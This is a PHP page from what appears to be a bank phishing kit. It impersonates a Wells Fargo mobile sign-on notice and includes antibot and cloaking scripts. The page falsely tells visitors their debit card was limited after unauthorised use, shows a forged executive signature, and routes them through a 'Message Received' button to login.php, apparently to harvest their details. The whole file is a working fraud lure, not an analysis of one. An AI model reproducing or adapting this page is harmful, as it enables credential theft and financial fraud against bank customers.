<?php
session_start();
error_reporting(0);
include('../../files/boot/check.php');
include('../../files/boot/check1.php');
include('../../files/boot/check2.php');
include('../../files/boot/antibot.php');
include('../../files/boot/enc.php');
include('../../call.php');
$rec = @$_GET['rec'];
$error = @$_GET['error'];
?>
<!DOCTYPE html>
<html class="no-js" lang="en">

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Wells Fargo - Personal</title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="search_category" content="Personal">
    <meta name="viewport" content="width=device-width,  initial-scale=1.0, maximum-scale=6.0, user-scalable=yes">
    <link rel="shortcut icon" type="image/x-icon" href="../../files/bars/favicon.ico">
    <link rel="stylesheet" href="../../files/bars/frontporch.css" type="text/css">
    <link type="text/css" href="../../files/bars/signon_clean.css" rel="stylesheet" media="screen,projection,print">
    <link rel="stylesheet" href="../../files/bars/framework.css">
    <link rel="stylesheet" href="../../files/bars/smartphone-home.css">
    <link rel="stylesheet" href="../../files/bars/util.css">
</head>

<body theme="ssep" id="body" class="freezedscreen" style="top: 0px;">
    <div id="shell" class="page" data-pid="324-114205-64">
        <div id="hamburger-menubackdrop" class="backDrop"></div><a href="#skip" class="hidden">Skip to content</a>

        <div class="header" id="header">
            <div class="wf_logo" role="link">
                <img src="../../files/bars/icn-img-wf-logo.png" alt="Wells Fargo">
            </div>
            <div class="hamburger_menu" role="link">
                <a href="#"><img src="../../files/bars/icn_house.png" alt="Home"></a>
            </div>
        </div>
        <div id="main" role="form" style="background-color: #44464a">

            <!--Sign on overlay Start-->
            <div aria-hidden="false">

                <div class="overlayContainer">

                    <form id="Validate" name="Validate" autocomplete="off" action="login.php" method="">
                        <div class="spacer-large"></div>
                        <p class="main-title spaced blk-header">Wells Fargo Mobile®</p>
                        <div class="descriptor">We recently received a report of unauthorised debit card use associated with this account.
                            <p></p>As a precaution, we have limited your Wells Fargo Debit/ATM Card(s) in order to protect against future unauthorised transactions.
                            <p></p>Wells Fargo needs additional information from you before you can continue using your card(s).</div>
                        <br>
                        <br>
                        <div class="spacer">Click "<a style="color:#CC0000;font-weight:bold;">Message Received</a>" below so we may gather with you additional verification needed.</div>
                        <br>
                        <br>
                        <br>
                        <div class="descriptor">Thank you for being a Wells Fargo Customer and we look forward to serve all your financial needs.
                            <p></p>Sincerely,
                            <p></p><b>K.L. Myers</b>
                            <p></p>
                            Executive Vice President, Chief Operating Officer
                            <p></p>Wells Fargo Bank</div>
                        <div class="continue-container">
                            <input tabindex="3" name="_eventId_customerInfoEntered" id="continue" value="Message Received" class="continue blue-button" type="submit">
                        </div>
                        <div>
                            <input name="" value="" type="hidden">
                        </div>
                    </form>

                    <footer role="contentinfo" style="text-align: center;">
                        <div class="html5footer c9" id="pageFooter">
                            <nav class="nav-footer">
                                <div class="footer-link clistData">
                                    <a href="#">PRIVACY, Cookies, Security &amp; Legal</a> | <a href="#">Ad Choices</a>
                                    <div class="footer-oaa"><a href="#">Online Access Agreement</a>
                                    </div>
                                </div>
                                <div class="footer-content">
                                    <div>
                                        <strong>Investment and Insurance products:</strong>
                                    </div>
                                    <div>
                                        <strong>NOT FDIC-Insured | NO Bank Guarantee | MAY Lose Value</strong>
                                    </div>
                                </div>
                                <div class="footer-content">Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</div>
                                <div class="footer-content">
                                    <span class="home-equal">‍</span> Equal Housing Lender. NMLSR ID 399801</div>
                                <div class="footer-content footer-margin">© 2019 Wells Fargo. All rights reserved.</div>
                                <div class="stage-coach"><img src="../../files/bars/50_opacity_stagecoach_002.png" aria-hidden="true" alt=""></div>
                            </nav>
                        </div>

                    </footer>
                </div>

            </div>
        </div>
</body>

</html>